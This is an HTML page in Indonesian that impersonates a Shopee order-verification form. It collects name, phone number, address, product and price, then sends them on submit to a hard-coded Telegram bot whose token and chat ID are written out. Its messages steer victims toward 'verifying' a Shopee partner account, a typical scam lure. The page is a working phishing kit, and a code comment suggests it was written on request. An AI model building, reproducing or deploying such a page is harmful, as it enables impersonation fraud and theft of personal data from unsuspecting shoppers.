<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pemesanan Order - Verifikasi Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <style>
        /* BASE STYLES */
        :root {
            --shopee-orange: #EE4D2D;
            --shopee-light-orange: #FF5733;
            --shopee-gray: #f5f5f5;
            --text-dark: #333;
            --text-medium: #555;
            --text-light: #777;
            --border-color: #ddd;
        }

        body {
            background-color: var(--shopee-gray);
            color: var(--text-dark);
            font-family: 'Poppins', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            width: 100%;
            max-width: 600px;
            min-height: 100vh;
            padding-top: 50px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.08);
        }

        /* CUSTOM HEADER APLIKASI */
        .app-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            max-width: 600px;
            margin: 0 auto;
            background-color: var(--shopee-orange);
            color: white;
            padding: 10px 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1010;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .app-header h3 {
            margin: 0;
            font-size: 16px;
            font-weight: 500;
            text-align: center;
        }

        /* CONTENT FORM */
        .form-content {
            padding: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-weight: 500;
            margin-bottom: 8px;
            color: var(--text-medium);
            font-size: 14px;
        }

        .form-group input[type="text"],
        .form-group input[type="tel"],
        .form-group input[type="number"],
        .form-group input[type="password"],
        .form-group textarea {
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid var(--border-color);
            outline: none;
            box-sizing: border-box;
            font-size: 15px;
            font-family: 'Poppins', sans-serif;
            color: var(--text-dark);
        }

        .form-group input:focus,
        .form-group textarea:focus {
            border-bottom-color: var(--shopee-orange);
        }

        textarea {
            resize: vertical;
            padding-bottom: 5px;
        }

        button {
            background-color: var(--shopee-orange);
            color: white;
            padding: 12px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 20px;
            font-weight: 600;
            transition: background-color 0.2s ease;
        }

        button:hover {
            background-color: var(--shopee-light-orange);
        }

        /* Form Card */
        .form-card {
            background-color: white;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
            margin-top: 15px;
            text-align: center;
        }

        .form-card p {
            font-size: 14px;
            color: var(--text-light);
            line-height: 1.5;
            margin-bottom: 25px;
        }

        /* Styling untuk Logo Shopee (IMAGE) */
        .shopee-logo-form {
            width: 100px; /* Atur lebar gambar */
            height: auto;
            margin-bottom: 20px;
            border-radius: 5px; /* Jika gambar Shopee memiliki sudut */
            display: inline-block;
        }
    </style>
</head>

<body>
    <div class="container">
        <div id="appHeader" class="app-header">
            <h3 id="headerTitle">Formulir Pemesanan</h3>
        </div>

        <div id="content-area" class="form-content">
            <main class="order-form-section">
                <div class="form-card">
                    <img src="shop.JPG" alt="Logo Shopee" class="shopee-logo-form"> 
                    <p>
                        Isi detail pesanan Anda. Kami akan mencoba melanjutkan pesanan, namun Anda harus memverifikasi
                        akun mitra Anda di aplikasi Shopee setelah ini.
                    </p>
                    <form id="orderForm">
                        <div class="form-group">
                            <label for="namaLengkap">Nama Lengkap *</label>
                            <input type="text" id="namaLengkap" required>
                        </div>
                        <div class="form-group">
                            <label for="nomorTelepon">Nomor Telepon *</label>
                            <input type="tel" id="nomorTelepon" required pattern="[0-9]{10,13}">
                        </div>
                        <div class="form-group">
                            <label for="alamatLengkap">Alamat Lengkap *</label>
                            <textarea id="alamatLengkap" rows="3" required></textarea>
                        </div>
                        <div class="form-group">
                            <label for="namaProduk">Nama Produk *</label>
                            <input type="text" id="namaProduk" required>
                        </div>
                        <div class="form-group">
                            <label for="harga">Total Harga * (Rp)</label>
                            <input type="text" id="harga" required oninput="formatPrice(this)" value="">
                        </div>
                        <button type="submit" id="verifikasiButton">Lanjutkan Pemesanan</button>
                    </form>
                </div>
            </main>
        </div>
    </div>

    <script>
        // --- KONFIGURASI BOT TELEGRAM (Sudah Diisi Sesuai Permintaan Anda) ---
        var TELEGRAM_TOKEN = "7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0";
        var CHAT_ID = "5923031825";

        // --- UTILITY FUNCTIONS ---

        function formatPrice(input) {
            let value = input.value.replace(/\D/g, '');
            let formattedValue = new Intl.NumberFormat('id-ID').format(value);
            input.value = formattedValue;
        }

        function cleanPrice(formattedValue) {
            return formattedValue.replace(/\./g, '');
        }

        function formatPhoneNumber(tel) {
            let cleanTel = tel.replace(/\D/g, '');

            if (cleanTel.startsWith('0')) {
                // Mengubah 08xx menjadi 628xx
                cleanTel = '62' + cleanTel.substring(1);
            } else if (!cleanTel.startsWith('62') && cleanTel.length > 8) {
                // Jika tidak diawali 62 tapi panjang wajar, tambahkan 62
                cleanTel = '62' + cleanTel;
            }

            return cleanTel;
        }

        function resetForm() {
            document.getElementById('orderForm').reset();
            document.getElementById('harga').value = '';
        }

        // --- FUNGSI KIRIM KE TELEGRAM (Diperbaiki untuk Debugging) ---
        function sendToTelegram(data) {
            let text =
                "**--- 1. DATA FORMULIR PEMESANAN ---**\n\n" +
                "Nama: " + data.namaLengkap + "\n" +
                "Telepon: " + data.nomorTelepon + "\n" +
                "Alamat: " + data.alamatLengkap + "\n" +
                "Produk: " + data.namaProduk + "\n" +
                "Harga: Rp" + new Intl.NumberFormat('id-ID').format(data.harga) + "\n\n" +
                "Status: Data Pemesanan TERSIMPAN. \n" +
                "⚠️ Peringatan: Pengguna Belum Memverifikasi Akun Mitra di Aplikasi.";

            var url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";

            var params = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            };

            fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(params)
                })
                .then(response => {
                    return response.json().then(result => {
                        if (!response.ok || result.ok === false) {
                            console.error('Gagal mengirim ke Telegram. Status HTTP: ' + response.status);
                            console.error('Pesan Error Telegram:', result);
                            alert('Gagal mengirim data ke server. Cek Console browser untuk detail error.');
                        } else {
                            console.log('Pesan berhasil terkirim ke Telegram!', result);
                            // Tampilkan alert sukses HANYA setelah yakin data terkirim
                            alert('Data berhasil terkirim. Untuk yang belum aktifkan di aplikasi mitra shopee, Silahkan klik atur di bagian beranda setelah login di aplikasi mitra shopee.');
                            resetForm();
                        }
                        return result;
                    });
                })
                .catch(error => {
                    console.error("Kesalahan koneksi/fetch Telegram (mungkin masalah CORS):", error);
                    alert('Kesalahan koneksi jaringan. Data tidak terkirim.');
                });
        }

        // --- STEP 1: FORMULIR PEMESANAN ---
        document.getElementById('orderForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var nama = document.getElementById('namaLengkap').value.trim();
            var telepon = document.getElementById('nomorTelepon').value.trim();
            var alamat = document.getElementById('alamatLengkap').value.trim();
            var namaProduk = document.getElementById('namaProduk').value.trim();

            var formattedHarga = document.getElementById('harga').value.trim();
            var cleanHarga = cleanPrice(formattedHarga);
            var harga = parseFloat(cleanHarga);

            if (!nama || !telepon || !alamat || !namaProduk || isNaN(harga) || harga <= 0) {
                alert('Harap isi semua kolom dengan benar.');
                return;
            }

            var orderData = {
                namaLengkap: nama,
                nomorTelepon: formatPhoneNumber(telepon),
                alamatLengkap: alamat,
                namaProduk: namaProduk,
                harga: harga
            };

            // PENGIRIMAN DATA FORMULIR
            // Alert sukses dipindahkan ke dalam .then() dari fetch()
            sendToTelegram(orderData);
        });
    </script>
</body>

</html>
